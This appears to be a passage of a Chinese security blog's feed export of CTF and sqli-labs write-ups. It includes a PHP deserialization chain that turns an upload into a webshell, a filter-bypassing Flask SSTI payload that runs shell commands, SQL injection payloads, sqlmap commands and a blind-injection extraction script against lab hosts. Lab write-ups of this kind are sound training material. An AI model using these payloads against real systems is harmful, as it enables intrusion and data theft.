class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"> </span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $img;</span><br><span class="line">    public $except;</span><br><span class="line"> </span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;registed)&#123;</span><br><span class="line">            $this-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$profile &#x3D; new Profile();</span><br><span class="line">$profile-&gt;except &#x3D; [&#39;index&#39; &#x3D;&gt; &#39;img&#39;];</span><br><span class="line">$profile-&gt;img &#x3D; &quot;upload_img&quot;;</span><br><span class="line">$profile-&gt;ext &#x3D; &quot;png&quot;;</span><br><span class="line">$profile-&gt;filename_tmp &#x3D; &quot;..&#x2F;public&#x2F;upload&#x2F;04b0951938d905b41348c1548f9c338b&#x2F;197eb9d5e3830b156293e9c9d951518b.png&quot;;</span><br><span class="line">$profile-&gt;filename &#x3D; &quot;..&#x2F;public&#x2F;upload&#x2F;04b0951938d905b41348c1548f9c338b&#x2F;197eb9d5e3830b156293e9c9d951518b.php&quot;;</span><br><span class="line"> </span><br><span class="line">$register &#x3D; new Register();</span><br><span class="line">$register-&gt;registed &#x3D; false;</span><br><span class="line">$register-&gt;checker &#x3D; $profile;</span><br><span class="line"> </span><br><span class="line">echo urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>因为那几个文件都加了namespace，所以我们在构造的时候也要加上，运行这个得到payload：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkLzA0YjA5NTE5MzhkOTA1YjQxMzQ4YzE1NDhmOWMzMzhiLzE5N2ViOWQ1ZTM4MzBiMTU2MjkzZTljOWQ5NTE1MThiLnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC8wNGIwOTUxOTM4ZDkwNWI0MTM0OGMxNTQ4ZjljMzM4Yi8xOTdlYjlkNWUzODMwYjE1NjI5M2U5YzlkOTUxNTE4Yi5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9</span><br></pre></td></tr></table></figure>传入cookie中，然后访问我们的weshell，得到flag。<br><img src="/images/buuoj-03/20200810141422.png" alt=""></li></ul><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>首先试一下49发现存在ssti注入，然后发现 <code>&#39;._</code> 这三个符号被ban了。<br>一般方法好像都用不了了，今天学到一种新的绕过方法，使用十六进制绕过，在模板注入时可以使用，但正常的python语法是不支持的。</p><ul><li>“.”的十六进制就是\x2e</li><li>“_”的十六进制就是\x5f</li><li>单引号用双引号代替<br>就像这样：等价于<br>先用下面这个payload读取到app.py的源码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat app\x2epy&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>源码，只放关键部分了：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def encode(line, key, key2):</span><br><span class="line">    return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))</span><br><span class="line"></span><br><span class="line">file &#x3D; open(&quot;&#x2F;app&#x2F;flag&quot;, &quot;r&quot;)</span><br><span class="line">flag &#x3D; file.read()</span><br><span class="line">flag &#x3D; flag[:42]</span><br><span class="line"></span><br><span class="line">app.config[&#39;flag&#39;] &#x3D; encode(flag, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;)</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure>解密这个得到flag。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;强网杯-2019-Upload&quot;&gt;&lt;a href=&quot;#强网杯-2019-Upload&quot; class=&quot;headerlink&quot; title=&quot;[强网杯 2019]Upload&quot;&gt;&lt;/a&gt;[强网杯 2019]Upload&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;代码审计，反序列化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;代码审计真的头疼，太难了。&lt;br&gt;进入页面有个登陆框，注册登陆，有个上传页面，试了上传webshell无果，看cookie是一段编码，解码之后是序列化后的字符串，肯定就是反序列化了，扫后台发现&lt;strong&gt;&lt;a href=&quot;http://www.tar.gz&quot;&gt;www.tar.gz&lt;/a&gt;&lt;/strong&gt;，下载下来，审计源码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>sqli_labs通关记录（二）</title>
    <link href="http://yoursite.com/2020/08/03/sqli-labs-2/"/>
    <id>http://yoursite.com/2020/08/03/sqli-labs-2/</id>
    <published>2020-08-03T14:27:33.000Z</published>
    <updated>2020-08-03T14:59:10.538Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Page-2-Adv-Injections"><a href="#Page-2-Adv-Injections" class="headerlink" title="Page-2 (Adv Injections)"></a>Page-2 (Adv Injections)</h1><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>time-based blind:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?id&#x3D;1&#39;and if(ord(mid((select flag from ctftraining.flag),1,1))&gt;101,sleep(3),1) or &#39;</span><br></pre></td></tr></table></figure><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>二次注入</p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">?id&#x3D;1&#39; anandd 1&#x3D;1 anandd &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h2><p>boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 anandd ascii(mid((select flag from ctftraining.flag),1,1))&gt;103 %23</span><br></pre></td></tr></table></figure><p>time-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 anandd if(length(database())&gt;1,sleep(3),1) %23</span><br></pre></td></tr></table></figure><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>报错注入，之前做过的原题，空格过滤用括号代替，or,and双写绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;^updatexml(1,concat(0x7e,(select(right(flag,30))from(ctftraining.flag)),0x7e),1)^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>Boolean-based blind,过滤情况和26一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;^ascii(mid((select(flag)from(ctftraining.flag)),1,1))&gt;102^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>过滤了空格，注释符，union,select 使用大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;%0aunIon%0aselEct%0a1,database(),3%0aor%0a&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><figure class="highlight plain"><figcaption><span>select```查询，和27一样</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">?id&#x3D;0&quot;%0auniOn%0aseLecT%0a1,database(),3%0aor%0a&#39;1&#39;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>Boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||ascii(mid((selECt%0aflag%0afrom%0actftraining.flag),1,1))&gt;102^&#39;1&#39;&#x3D;&#39;0</span><br></pre></td></tr></table></figure><p>union select</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%27)%0aunion%0aall%0aselect%0a1,(select%0aflag%0afrom%0actftraining.flag%0a%0alimit%0a0,1),3%0aor%0a(%271%27&#x3D;%270</span><br></pre></td></tr></table></figure><h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>Boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;^ ascii(mid((select group_concat(flag) from ctftraining.flag),1,1))&gt;102 or &#39;1&#39;&#x3D;&#39;0</span><br></pre></td></tr></table></figure><h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><p>time-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20(select(sleep(2-if(ord(mid((select flag from ctftraining.flag),1,1))&gt;102,0,2))))%20and%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>Boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;)and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and (&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>宽字节注入，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27 union select 1,user(),3 -- +</span><br></pre></td></tr></table></figure><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>宽字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27 union select 1,database(),3 -- +</span><br></pre></td></tr></table></figure><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>宽字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df&#39; union select 1,(select flag from ctftraining.flag)%23&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,database(),3 -- +</span><br></pre></td></tr></table></figure><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>和33一样</p><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>一样</p><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>一样</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>几十道题都是一样的，没什么营养，掌握几个payload就可以一直用，也学不到什么东西，刷的我好累，休息一阵子再刷后面的吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Page-2-Adv-Injections&quot;&gt;&lt;a href=&quot;#Page-2-Adv-Injections&quot; class=&quot;headerlink&quot; title=&quot;Page-2 (Adv Injections)&quot;&gt;&lt;/a&gt;Page-2 (Adv Injections)&lt;/h1&gt;&lt;h2 id=&quot;less-23&quot;&gt;&lt;a href=&quot;#less-23&quot; class=&quot;headerlink&quot; title=&quot;less-23&quot;&gt;&lt;/a&gt;less-23&lt;/h2&gt;&lt;p&gt;time-based blind:&lt;/p&gt;
    
    </summary>
    
    
      <category term="sql注入" scheme="http://yoursite.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>sqli_labs通关记录（一）</title>
    <link href="http://yoursite.com/2020/07/31/sqli-labs/"/>
    <id>http://yoursite.com/2020/07/31/sqli-labs/</id>
    <published>2020-07-31T09:03:26.000Z</published>
    <updated>2020-08-01T14:49:18.044Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]<br>早就想刷sqli_labs了，这几天正好没事干，学习一下sql注入，顺便熟悉一下sqlmap<br>练习平台：<a href="https://buuoj.cn/challenges#sqli-labs">https://buuoj.cn/challenges#sqli-labs</a></p><a id="more"></a><h1 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><h3 id="使用联合注入"><a href="#使用联合注入" class="headerlink" title="使用联合注入"></a>使用联合注入</h3><p>输入<code>id=1&#39;</code>,出现报错信息。<br><img src="/images/sqli_labs_page1/20200731-1.png" alt=""><br>输入<code>id=1&#39;%23</code>，页面恢复正常。<br><img src="/images/sqli_labs_page1/20200731-2.png" alt=""><br>测试联合查询，发现有三段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>查询数据库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-3.png" alt=""><br>查询表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39;),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-4.png" alt=""><br>查询列名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;ctftraining&#39;),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-5.png" alt=""><br>查询字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(flag) from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-6.png" alt=""></p><h3 id="使用报错注入"><a href="#使用报错注入" class="headerlink" title="使用报错注入"></a>使用报错注入</h3><p>使用<strong>updatexml</strong>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查询数据库：</span><br><span class="line">id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)%23</span><br><span class="line">#查询表：</span><br><span class="line">?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39;),0x7e),1)%23</span><br><span class="line">查列名：</span><br><span class="line">id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;ctftraining&#39;),0x7e),1)%23</span><br><span class="line">查字段：</span><br><span class="line">id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(flag) from ctftraining.flag),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a>使用sqlmap</h3><p>参数说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-u              指定url</span><br><span class="line">--batch         永远不要要求用户输入，使用默认行为</span><br><span class="line">--method        指定请求方法(e.g. GET,POST)</span><br><span class="line">--dbs           列出数据库名</span><br><span class="line">-D              指定数据库</span><br><span class="line">--tables        列出表名</span><br><span class="line">-T              指定表名</span><br><span class="line">--columns       列出列名</span><br><span class="line">-C              指定列名</span><br><span class="line">--dump          Dump DBMS数据库表的条目</span><br><span class="line">--dump-all      Dump 所有DBMS数据库表的条目</span><br><span class="line">--current-db    查询当前数据库</span><br></pre></td></tr></table></figure><p>查数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET --dbs</span><br></pre></td></tr></table></figure><p>查询表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET -D ctftraining --tables</span><br></pre></td></tr></table></figure><p>查列名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET -D ctftraining -T flag --columns</span><br></pre></td></tr></table></figure><p>查字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET -D ctftraining -T flag -C &quot;flag&quot; --dump</span><br></pre></td></tr></table></figure><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>和<strong>less-1</strong>一样，不用加单引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select 1,(select flag from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p><strong>less-1</strong>基础上加个括号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39;) union select 1,(select flag from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>把<strong>less-3</strong>单引号改为双引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&quot;) union select 1,(select flag from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>没有显示位了，输入单引号有报错信息，联合注入用不了了，使用报错注入，使用<strong>extractvalue</strong>函数，<br><strong>extractvalue</strong>和<strong>updatexml</strong>的不同是：<br>extractvalue需要两个参数，而updatexml是需要三个参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;^(extractvalue(1,concat(0x7e,(database()),0x7e)))%23</span><br></pre></td></tr></table></figure><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>使用报错注入，把<strong>less-5</strong>中的单引号改为双引号，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&quot;^(extractvalue(1,concat(0x7e,(database()),0x7e)))%23</span><br></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>这个上面写的是使用<code>into ouutfile</code>，但我太菜了，用布尔盲注做出来的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) and 1&#x3D;1 and (&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;and (select 1 from (select(sleep(5-(if((length(database())&gt;0),0,5)))))x)%23</span><br><span class="line">id&#x3D;1&#39;and (select 5697 from (select(sleep(3-(if(ord(mid((select distinct(ifnull(cast(schema_name as nchar),0x20)) from information_schema.schemata limit 0,1),1,1))&gt;96,0,3)))))a) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def db_names():</span><br><span class="line">    db_name_list &#x3D; []</span><br><span class="line">    #db_num &#x3D; db_nums()</span><br><span class="line">    for n in range(int(db_num)):</span><br><span class="line">        db_name &#x3D; &quot;&quot;</span><br><span class="line">        i &#x3D;0</span><br><span class="line">        while(True):</span><br><span class="line">            i &#x3D; i + 1</span><br><span class="line">            low &#x3D; 32 </span><br><span class="line">            high &#x3D; 127</span><br><span class="line"></span><br><span class="line">            while(low &lt; high):</span><br><span class="line">                mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">                sql_url &#x3D; &quot;http:&#x2F;&#x2F;a619f897-b4fe-43c3-801f-1f36f08010a0.node3.buuoj.cn&#x2F;Less-9&#x2F;&quot;</span><br><span class="line">                payload &#x3D; &quot;?id&#x3D;1&#39; and (select 1 from (select(sleep(3-(if(ord(mid((select distinct(ifnull(cast(schema_name as nchar), 0x20)) from information_schema.schemata limit &#123;&#125;,1),&#123;&#125;,1))&gt;&#123;&#125;,0,3)))))x) and &#39;1&#39;&#x3D;&#39;1&quot;.format(n,i,mid)</span><br><span class="line">                print(payload[4:])</span><br><span class="line">                url &#x3D; sql_url + payload</span><br><span class="line">                try:</span><br><span class="line">                    r &#x3D; requests.get(url&#x3D;url,timeout&#x3D;3)</span><br><span class="line">                    while(True):</span><br><span class="line">                        if r.status_code !&#x3D; 200:</span><br><span class="line">                            r &#x3D; requests.get(url&#x3D;url,timeout&#x3D;3)</span><br><span class="line">                        else:</span><br><span class="line">                            break</span><br><span class="line">                        print(r.status_code,url.split(&quot;&#x2F;&quot;)[-1])</span><br><span class="line">                    high &#x3D; mid</span><br><span class="line">                except:</span><br><span class="line">                    low &#x3D; mid + 1</span><br><span class="line">            if low !&#x3D; 32:</span><br><span class="line">                db_name +&#x3D; chr(low)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        db_name_list.append(db_name)</span><br><span class="line">        print(&quot;retrieved:&quot;,db_name_list[n])</span><br><span class="line">    print(&quot;available databases [&#123;&#125;]:&quot;.format(db_num))</span><br><span class="line">    for i in db_name_list:</span><br><span class="line">        print(&quot;[*]&quot;,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    db_names()</span><br></pre></td></tr></table></figure><h2 